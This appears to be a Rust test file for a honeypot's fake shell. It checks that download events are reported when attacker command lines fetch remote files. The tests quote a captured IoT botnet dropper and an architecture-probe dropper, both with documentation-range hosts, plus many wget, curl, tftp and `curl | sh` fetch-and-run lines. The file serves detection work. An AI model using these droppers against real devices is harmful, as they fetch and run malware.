//! Download events come from what a line executes. Hosts are RFC 5737 documentation addresses.

use super::{BudgetHit, EmitContext, FakeShell};
use crate::fakefs::FakeFs;
use sensor_wire::{SIGNAL_HONEYPOT_FILE_DOWNLOAD, SensorEvent};

const HOST: &str = "198.51.100.9";

fn ctx(label: &str) -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: label.to_string(),
        session_id: None,
    }
}

fn shell() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx("telnet"))
}

fn exec() -> FakeShell {
    FakeShell::exec(FakeFs::new(), ctx("ssh"))
}

fn android() -> FakeShell {
    FakeShell::android(FakeFs::android(), ctx("adb"))
}

fn downloads(events: &[SensorEvent]) -> Vec<&SensorEvent> {
    events
        .iter()
        .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
        .collect()
}

/// The `url` of each download event of `events`, `-` for an event that carries a command instead.
fn urls(events: &[SensorEvent]) -> Vec<String> {
    downloads(events)
        .iter()
        .map(|e| e.metadata["url"].as_str().unwrap_or("-").to_string())
        .collect()
}

fn urls_of(sh: &mut FakeShell, line: &str) -> Vec<String> {
    urls(&sh.handle_input(line).1)
}

fn at(path: &str) -> String {
    format!("http://{HOST}/{path}")
}

/// The dropper the sensor saw on telnet 2026-10-08, host replaced, written line by line.
const DROPPER: [&str; 6] = [
    "echo 'for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do' >> .s",
    "echo 'wget -q http://198.51.100.9/$a -O .c||curl -s http://198.51.100.9/$a -o .c||tftp -g -l .c -r $a 198.51.100.9||tftp -g -l $a 198.51.100.9' >> .s",
    "echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s",
    "echo 'rm -f .c $a' >> .s",
    "echo 'done' >> .s",
    "sh .s; rm -f .s",
];

#[test]
fn a_script_written_by_echo_reports_nothing_until_it_runs_and_then_what_it_fetched() {
    for mut sh in [shell(), android()] {
        // The phone's shell starts in a read-only `/`.
        sh.handle_input("cd /data/local/tmp 2>/dev/null; cd /tmp 2>/dev/null");
        for line in &DROPPER[..5] {
            let (_, events) = sh.handle_input(line);
            assert_eq!(urls(&events), Vec::<String>::new(), "{line}");
            assert_eq!(events.len(), 1, "{line}: the command event alone");
        }
        let (_, events) = sh.handle_input(DROPPER[5]);
        // The fake fetch succeeds and runs, so the loop's `&& break` ends it after the first
        // architecture, as it would for a bot whose first binary ran.
        assert_eq!(urls(&events), vec![at("mips")]);
    }
}

#[test]
fn text_that_only_contains_a_fetch_is_not_one() {
    let mut sh = shell();
    for line in [
        "echo 'wget http://198.51.100.9/x' >> .s",
        "echo wget http://198.51.100.9/x > .s",
        "echo \"curl -s http://198.51.100.9/x | sh\"",
        "printf '%s\\n' 'wget http://198.51.100.9/x' >> .s",
        "S='wget http://198.51.100.9/x'",
        "S=\"tftp -g -r x 198.51.100.9\"; echo $S",
    ] {
        assert_eq!(urls_of(&mut sh, line), Vec::<String>::new(), "{line}");
    }
    // A here-document body typed on its own lines is data too.
    for line in ["cat > .h <<EOF", "wget http://198.51.100.9/body", "EOF"] {
        let (_, events) = sh.handle_input(line);
        assert!(downloads(&events).is_empty(), "{line}");
    }
    assert_eq!(
        sh.handle_input("cat .h").0,
        "wget http://198.51.100.9/body\n"
    );
}

#[test]
fn a_fetch_in_sh_dash_c_reports_the_url_its_script_expanded() {
    let mut sh = shell();
    assert_eq!(
        urls_of(
            &mut sh,
            "export A=zed; sh -c 'wget -q http://198.51.100.9/$A -O /tmp/z'"
        ),
        vec![at("zed")]
    );
    assert_eq!(
        urls_of(
            &mut sh,
            "sh -c \"wget -q http://198.51.100.9/\\$0 -O /tmp/z\" named"
        ),
        vec![at("named")]
    );
}

#[test]
fn a_fetch_in_a_script_file_reports_the_url_it_ran() {
    let mut sh = shell();
    sh.handle_input("echo 'U=http://198.51.100.9; wget -q $U/script -O /tmp/s' > /tmp/run.sh");
    assert_eq!(urls_of(&mut sh, "sh /tmp/run.sh"), vec![at("script")]);
    sh.handle_input("echo 'wget -q http://198.51.100.9/$1 -O /tmp/s' > /tmp/arg.sh");
    assert_eq!(urls_of(&mut sh, "sh /tmp/arg.sh first"), vec![at("first")]);
}

#[test]
fn a_fetch_in_a_for_loop_reports_each_expanded_url() {
    let mut sh = shell();
    assert_eq!(
        urls_of(
            &mut sh,
            "for a in mips arm; do wget -q http://198.51.100.9/$a -O /tmp/x; done"
        ),
        vec![at("mips"), at("arm")]
    );
}

#[test]
fn a_fetch_after_a_variable_assignment_reports_the_expanded_url() {
    let mut sh = shell();
    assert_eq!(
        urls_of(&mut sh, "U=http://198.51.100.9; wget -q $U/x -O /tmp/x"),
        vec![at("x")]
    );
    assert_eq!(
        urls_of(
            &mut sh,
            "H=198.51.100.9 P=bins; curl -s http://$H/$P/y -o /tmp/y"
        ),
        vec![at("bins/y")]
    );
}

#[test]
fn a_fetch_named_by_a_command_substitution_reports_what_it_printed() {
    let mut sh = shell();
    assert_eq!(
        urls_of(&mut sh, "wget -q $(echo http://198.51.100.9/sub) -O /tmp/x"),
        vec![at("sub")]
    );
    assert_eq!(
        urls_of(&mut sh, "wget -q http://198.51.100.9/`uname -m` -O /tmp/x"),
        vec![at("x86_64")]
    );
}

#[test]
fn a_fetch_inside_a_function_is_still_reported() {
    // Functions are outside the grammar subset and never run, so the lexical fallback is what
    // reports this one.
    let mut sh = shell();
    assert_eq!(
        urls_of(
            &mut sh,
            "f() { wget -q http://198.51.100.9/fn -O /tmp/x; }; f"
        ),
        vec![at("fn")]
    );
}

#[test]
fn a_variable_that_is_not_set_makes_an_unparsed_fetch_not_a_url() {
    let mut sh = shell();
    let (_, events) = sh.handle_input("wget -q http://198.51.100.9/$NOPE -O /tmp/x");
    let dl = downloads(&events);
    assert_eq!(dl.len(), 1);
    assert!(dl[0].metadata.get("url").is_none(), "{:?}", dl[0].metadata);
    assert_eq!(
        dl[0].metadata["command"],
        "wget -q http://198.51.100.9/$NOPE -O /tmp/x"
    );
    // An unset variable elsewhere in the command leaves a good URL alone.
    assert_eq!(
        urls_of(&mut sh, "wget -O $NOOUT http://198.51.100.9/ok"),
        vec![at("ok")]
    );
    // A single-quoted `$` is not expanded: still no url.
    let (_, events) = sh.handle_input("wget 'http://198.51.100.9/$a' -O /tmp/x");
    assert!(downloads(&events)[0].metadata.get("url").is_none());
}

#[test]
fn a_fetch_the_line_did_not_reach_is_still_reported_by_the_fallback() {
    let mut sh = shell();
    assert_eq!(
        urls_of(
            &mut sh,
            "[ -f /nonexistent ] && wget -q http://198.51.100.9/skipped"
        ),
        vec![at("skipped")]
    );
    assert_eq!(
        urls_of(
            &mut sh,
            "false && nohup curl -s http://198.51.100.9/wrapped &"
        ),
        vec![at("wrapped")]
    );
    assert_eq!(
        urls_of(&mut sh, "false && sh -c 'wget http://198.51.100.9/inner'"),
        vec![at("inner")]
    );
    // The branch not taken names a variable: a command, no url.
    let (_, events) = sh.handle_input("false && wget -q http://198.51.100.9/$A");
    assert!(downloads(&events)[0].metadata.get("url").is_none());
}

#[test]
fn a_line_with_a_syntax_error_or_unreadable_text_still_reports_by_the_fallback() {
    let mut sh = shell();
    assert_eq!(
        urls_of(&mut sh, "wget -q http://198.51.100.9/syn -O /tmp/x )"),
        vec![at("syn")]
    );
    // An exec string is one complete unit: the open quote is a syntax error the tokenizer
    // cannot read past, and the whole-line scan takes over.
    let mut sh = exec();
    assert_eq!(
        urls_of(&mut sh, "wget http://198.51.100.9/open 'never closed"),
        vec![at("open")]
    );
}

#[test]
fn one_url_found_twice_is_one_event() {
    let mut sh = shell();
    // Executed, and again by the fallback's own reading of the same text.
    assert_eq!(
        urls_of(&mut sh, "wget -q http://198.51.100.9/d -O /tmp/d"),
        vec![at("d")]
    );
    assert_eq!(
        urls_of(
            &mut sh,
            "wget -q http://198.51.100.9/e -O /tmp/e || wget -q http://198.51.100.9/e -O /tmp/e"
        ),
        vec![at("e")]
    );
    // Run twice by a loop.
    assert_eq!(
        urls_of(
            &mut sh,
            "for i in 1 2 3; do wget -q http://198.51.100.9/same -O /tmp/s; done"
        ),
        vec![at("same")]
    );
}

#[test]
fn a_loop_of_a_thousand_fetches_is_bounded_by_the_per_line_cap() {
    let mut sh = shell();
    let words = (0..1000)
        .map(|i| i.to_string())
        .collect::<Vec<_>>()
        .join(" ");
    let line = format!("for i in {words}; do wget -q http://198.51.100.9/f$i -O /tmp/f; done");
    let (_, events) = sh.handle_input(&line);
    assert_eq!(downloads(&events).len(), 8, "the per-line cap");
    assert_eq!(sh.last_trace().budget.hit, Some(BudgetHit::DownloadPerLine));
    let markers = events
        .iter()
        .filter(|e| e.metadata.get("flood").and_then(|v| v.as_str()) == Some("download_cap"))
        .count();
    assert_eq!(markers, 1);
}

#[test]
fn the_connection_allowance_bounds_what_scripts_report_across_lines() {
    let mut sh = shell();
    let mut total = 0;
    for round in 0..20 {
        let line = format!(
            "for i in 1 2 3 4 5 6 7 8; do wget -q http://198.51.100.9/r{round}x$i -O /tmp/f; done"
        );
        total += downloads(&sh.handle_input(&line).1).len();
    }
    assert_eq!(total, 64, "the connection's download ceiling");
}

/// The probe an IoT dropper runs on an SSH exec channel: `uname -m` in a substitution, a `case`
/// choosing the binary's name, then the fetch. The name must be the persona's own architecture,
/// the one `uname -m` prints on its own.
#[test]
fn an_architecture_probe_fetches_the_personas_own_binary() {
    let line = |host: &str| {
        format!(
            "cd /dev/shm||cd /tmp||cd /var/tmp||cd /;A=$(uname -m);case $A in \
             x86_64)U=x86_64;;i686|i386)U=x86;;aarch64|arm64)U=arm64;;armv7l|armv7)U=arm7;; \
             *)U=unknown;;esac; wget -q http://{host}/$U -O .z; chmod +x .z; ./.z"
        )
    };
    let mut ubuntu = exec();
    let arch = ubuntu.handle_input("uname -m").0.to_string();
    assert_eq!(arch, "x86_64\n");
    assert_eq!(
        urls_of(&mut ubuntu, &line(HOST)),
        vec![at(arch.trim_end())],
        "the url ends in the persona's arch, not in `$U`"
    );
    let mut phone = android();
    let phone_arch = phone.handle_input("uname -m").0.to_string();
    assert_eq!(phone_arch, "armv7l\n");
    assert_eq!(
        urls_of(&mut phone, &line(HOST)),
        vec![at("arm7")],
        "armv7l selects the arm7 arm"
    );
    // An architecture no arm names leaves `unknown`, still a real name and never `$U`.
    let mut other = shell();
    assert_eq!(
        urls_of(
            &mut other,
            &line(HOST).replace("x86_64)U=x86_64", "riscv)U=riscv")
        ),
        vec![at("unknown")]
    );
}

#[test]
fn bare_tftp_and_ftpget_are_reported_even_where_the_shell_has_no_such_file() {
    let mut sh = shell();
    let (out, events) = sh.handle_input("tftp -g -l .c -r mips 198.51.100.9");
    assert!(out.contains("not found"), "{out}");
    assert_eq!(urls(&events), vec!["tftp://198.51.100.9/mips".to_string()]);
    // busybox tftp without -r names the remote file after the local one, as busybox does.
    assert_eq!(
        urls_of(&mut sh, "busybox tftp -g -l local.bin 198.51.100.9"),
        vec!["tftp://198.51.100.9/local.bin".to_string()]
    );
    assert_eq!(
        urls_of(&mut sh, "ftpget 198.51.100.9 f bin.arm"),
        vec!["ftp://198.51.100.9/bin.arm".to_string()]
    );
}

#[test]
fn a_waiting_line_reports_its_fetches_once() {
    let mut sh = shell();
    let (step, events) = sh.start_line("wget -q http://198.51.100.9/held -O /tmp/h; cat > /tmp/in");
    assert!(matches!(step, super::LineStep::AwaitingInput));
    assert_eq!(urls(&events), vec![at("held")]);
    sh.finish_line(b"data\n", super::InputEnd::Eof);
    // The rerun on the ended input emits nothing more.
    assert_eq!(sh.handle_input("cat /tmp/in").0, "data\n");
}
